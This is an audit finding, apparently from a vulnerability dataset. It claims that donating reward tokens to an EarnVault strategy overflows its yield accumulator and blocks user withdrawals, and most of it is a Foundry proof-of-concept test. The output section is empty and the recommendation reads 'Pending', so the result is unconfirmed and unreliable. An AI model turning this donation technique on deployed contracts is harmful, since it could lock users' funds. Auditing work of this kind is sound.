# [H] Donated reward token can overflow the yieldAccumulator and revert user withdraw transaction

## Summary
Severity: High
Contest weight: 0.6136
Dataset id: 2949
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Let us add this proof of concept to EarnVault.t.sol:
```solidity
function test_reward_issue_poc() public {
uint256 amountToDeposit1 = 1 ether;
uint256 amountToDeposit2 = 120_000;
uint256 amountToDeposit3 = 240_000;
uint256 amountToDeposit4 = 240_000;
uint256 amountToReward = 100_000;
erc20.mint(address(this), 100000 ether);
uint256[] memory rewards = new uint256[](4);
uint256[] memory shares = new uint256[](4);
uint256 totalShares;
uint256 positionsCreated;
INFTPermissions.PermissionSet[] memory permissions =
PermissionUtils.buildPermissionSet(operator, PermissionUtils.permissions(vault.WITHDRAW_PERMISSION()));
bytes memory misc = "1234";
address[] memory strategyTokens = new address[](2);
strategyTokens[0] = address(erc20);
strategyTokens[1] = address(anotherErc20);
(StrategyId strategyId, EarnStrategyStateBalanceMock strategy) =
strategyRegistry.deployStateStrategy(strategyTokens);
uint256 previousBalance;
erc20.mint(address(strategy), 1 ether);
(uint256 positionId1,) =
vault.createPosition(strategyId, address(erc20), amountToDeposit1, positionOwner, permissions,
creationData, misc);
positionsCreated++;
anotherErc20.mint(address(strategy), amountToReward);
anotherErc20.mint(address(strategy), 1 ether);
(address[] memory tokens, uint256[] memory balances,,) = vault.position(positionId1);
uint256 amountToWithdraw = balances[0];
console.log(amountToWithdraw);
uint256[] memory amounts = new uint256[](2);
amounts[0] = balances[0];
amounts[1] = balances[1];
vm.prank(operator);
vault.withdraw(positionId1, tokens, amounts, address(this));
}
```
We run it with
forge test -vv --match-test "test_reward_issue_poc"
The output is:

## Recommendation
Pending.
